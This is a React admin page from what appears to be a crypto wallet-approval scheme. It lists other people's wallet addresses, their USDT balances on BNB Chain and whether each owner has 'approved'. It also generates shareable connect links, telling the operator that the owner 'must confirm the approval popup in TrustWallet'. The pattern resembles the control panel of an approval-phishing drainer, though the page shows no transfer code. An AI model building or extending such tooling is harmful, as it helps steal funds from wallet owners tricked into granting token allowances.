'use client'

import { useEffect, useState, useCallback } from 'react'
import api from '@/lib/api'

interface Account {
  id: number; account_number: string; wallet_address: string
  chain_id: string; approved: boolean; balance: string; balance_updated_at: string | null
}

interface ReapproveState {
  url: string
  copied: boolean
}

const Icons = {
  wallet: <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path strokeLinecap="round" strokeLinejoin="round" d="M21 12V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2h14a2 2 0 002-2v-2"/><path strokeLinecap="round" strokeLinejoin="round" d="M16 12a2 2 0 100 4 2 2 0 000-4z"/></svg>,
  refresh: <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>,
  link: <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path strokeLinecap="round" strokeLinejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.5-1.5"/><path strokeLinecap="round" strokeLinejoin="round" d="M10.172 13.828a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.5 1.5"/></svg>,
  copy: <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><rect x="9" y="9" width="13" height="13" rx="2"/><path strokeLinecap="round" strokeLinejoin="round" d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>,
  check: <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>,
}

export default function AccountsPage() {
  const [accounts,  setAccounts]  = useState<Account[]>([])
  const [syncing,   setSyncing]   = useState(false)
  const [reapprove, setReapprove] = useState<Record<number, ReapproveState>>({})
  const [generating, setGenerating] = useState<number | null>(null)

  const load = useCallback(async () => {
    try { setAccounts((await api.get('/accounts')).data) } catch { /**/ }
  }, [])

  useEffect(() => { load() }, [load])

  const tokenSymbol   = process.env.NEXT_PUBLIC_TOKEN_SYMBOL || 'USDT'
  const totalBalance  = accounts.reduce((s, a) => s + parseFloat(a.balance || '0'), 0)
  const approvedCount = accounts.filter(a => a.approved).length

  async function handleSync() {
    setSyncing(true)
    setTimeout(() => { load(); setSyncing(false) }, 1500)
  }

  async function requestReapproval(accountId: number) {
    setGenerating(accountId)
    try {
      const r = await api.post('/sessions')
      setReapprove(prev => ({ ...prev, [accountId]: { url: r.data.connect_url, copied: false } }))
    } catch { /**/ }
    finally { setGenerating(null) }
  }

  async function copyReapprovalLink(accountId: number) {
    const state = reapprove[accountId]
    if (!state) return
    await navigator.clipboard.writeText(state.url)
    setReapprove(prev => ({ ...prev, [accountId]: { ...state, copied: true } }))
    setTimeout(() => setReapprove(prev => ({ ...prev, [accountId]: { ...prev[accountId], copied: false } })), 2000)
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <p className="text-slate-500 text-sm">
          Total balance: <span className="font-semibold text-slate-800">{totalBalance.toFixed(2)} {tokenSymbol}</span>
          {' '}across {accounts.length} accounts ({approvedCount} approved)
        </p>
        <button onClick={handleSync} disabled={syncing}
          className="flex items-center gap-2 text-sm px-4 py-2 bg-white hover:bg-slate-50 border border-slate-200 text-slate-600 rounded-xl font-medium transition-all shadow-sm disabled:opacity-60">
          <span className={syncing ? 'animate-spin' : ''}>{Icons.refresh}</span>
          {syncing ? 'Syncing...' : 'Sync Balances'}
        </button>
      </div>

      {accounts.length === 0
        ? <div className="bg-white rounded-2xl border border-slate-100 p-16 text-center">
            <div className="w-14 h-14 rounded-2xl bg-indigo-50 flex items-center justify-center mx-auto mb-4 text-indigo-400">{Icons.wallet}</div>
            <p className="text-slate-600 font-medium">No accounts yet</p>
            <p className="text-slate-400 text-sm mt-1">Generate a connect link and share it</p>
          </div>
        : <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4">
            {accounts.map(acc => (
              <div key={acc.id} className="bg-white rounded-2xl border border-slate-100 shadow-sm p-5 hover:shadow-md transition-shadow">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-2.5">
                    <div className="w-10 h-10 rounded-full bg-indigo-50 flex items-center justify-center text-indigo-600 font-bold">
                      {acc.account_number.slice(-2)}
                    </div>
                    <div>
                      <p className="font-bold text-slate-800">{acc.account_number}</p>
                      <p className="text-xs text-slate-400">{acc.chain_id || 'BNB Chain'}</p>
                    </div>
                  </div>
                  <span className={`text-xs px-2.5 py-1 rounded-full font-medium ${
                    acc.approved ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'
                  }`}>
                    {acc.approved ? '✓ Approved' : 'Pending'}
                  </span>
                </div>

                <div className="bg-gradient-to-br from-slate-50 to-indigo-50/30 rounded-xl p-4 mb-4">
                  <p className="text-xs text-slate-400 mb-1">Balance</p>
                  <p className="text-2xl font-bold text-slate-800">
                    {parseFloat(acc.balance || '0').toFixed(2)}
                    <span className="text-sm font-medium text-slate-400 ml-1.5">{tokenSymbol}</span>
                  </p>
                  {acc.balance_updated_at && (
                    <p className="text-xs text-slate-400 mt-1">Updated {new Date(acc.balance_updated_at).toLocaleTimeString()}</p>
                  )}
                </div>

                <div className="flex items-center gap-2 bg-slate-50 rounded-lg px-3 py-2">
                  <p className="text-xs font-mono text-slate-500 truncate flex-1">{acc.wallet_address}</p>
                </div>

                {!acc.approved && (
                  <div className="mt-3">
                    {reapprove[acc.id] ? (
                      <div className="bg-amber-50 border border-amber-200 rounded-xl p-3">
                        <p className="text-xs text-amber-700 mb-2 font-medium">Share this link — owner must confirm the approval popup in TrustWallet:</p>
                        <p className="text-xs font-mono text-amber-800 break-all mb-2">{reapprove[acc.id].url}</p>
                        <div className="flex gap-2">
                          <button onClick={() => copyReapprovalLink(acc.id)}
                            className={`flex items-center gap-1 text-xs px-2.5 py-1.5 rounded-lg font-medium transition-all ${reapprove[acc.id].copied ? 'bg-green-100 text-green-700' : 'bg-amber-100 text-amber-700 hover:bg-amber-200'}`}>
                            {reapprove[acc.id].copied ? Icons.check : Icons.copy}
                            {reapprove[acc.id].copied ? 'Copied' : 'Copy'}
                          </button>
                          <a href={reapprove[acc.id].url} target="_blank" rel="noopener noreferrer"
                            className="flex items-center gap-1 text-xs px-2.5 py-1.5 bg-amber-500 text-white rounded-lg font-medium hover:bg-amber-600 transition-colors">
                            {Icons.link} Open
                          </a>
                        </div>
                      </div>
                    ) : (
                      <button onClick={() => requestReapproval(acc.id)} disabled={generating === acc.id}
                        className="w-full flex items-center justify-center gap-1.5 text-xs px-3 py-2 bg-amber-50 hover:bg-amber-100 border border-amber-200 text-amber-700 rounded-xl font-medium transition-all disabled:opacity-60">
                        {Icons.link}
                        {generating === acc.id ? 'Generating...' : 'Request Re-approval'}
                      </button>
                    )}
                  </div>
                )}
              </div>
            ))}
          </div>
      }
    </div>
  )
}
